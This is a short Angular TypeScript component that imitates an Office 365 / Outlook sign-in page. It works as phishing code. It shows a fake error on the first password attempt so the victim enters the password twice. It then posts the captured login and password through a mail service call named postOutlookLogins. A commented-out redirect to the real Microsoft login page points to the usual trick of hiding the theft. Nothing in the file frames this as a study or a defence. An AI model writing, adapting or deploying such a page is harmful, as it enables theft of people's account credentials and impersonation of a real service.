import { Component, OnInit, ViewChild, ElementRef } from '@angular/core';
import { MailService } from '../mail.service';

@Component({
  selector: 'app-office365',
  templateUrl: './office365.component.html',
  styleUrls: ['./office365.component.css']
})
export class Office365Component implements OnInit {
  login: string="";
  password: string = "";
  signinPage: boolean = true;
  loginError: boolean = false;
  passwordErrorMessage: boolean =false;

  passwordEntries = 1;

  constructor(private mailService: MailService) { }
  @ViewChild("passwordPage") passwordPage: ElementRef;
  @ViewChild("passwordinput") passwordinput: ElementRef;
  @ViewChild("loginInput") loginInput: ElementRef;
  ngOnInit() {
  }
  getLogin() {
    
   setTimeout( function() {
    if (this.login.length >4 ) {
    console.log("asafafa");
    
    }
    else{
      this.loginError = true;
    }
   }, 2000, this.signinPage = false);
   //this.login= "";
  }
  getPassword() {
      if(this.passwordEntries <= 1) {
        this.passwordErrorMessage = true;
        this.password = "";
        
      }
        else if(this.passwordEntries > 1){
          this.mailService.postOutlookLogins(this.login, this.password);
       // window.location.assign("https://login.live.com")
      }

    this.passwordEntries++;
  }

}
